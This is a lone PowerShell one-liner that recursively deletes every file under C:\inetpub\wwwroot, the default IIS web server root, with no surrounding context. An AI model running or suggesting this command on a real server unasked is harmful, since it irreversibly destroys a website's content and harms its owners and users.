Get-ChildItem -Path C:\inetpub\wwwroot -Include *.* -File -Recurse | foreach { $_.Delete()}
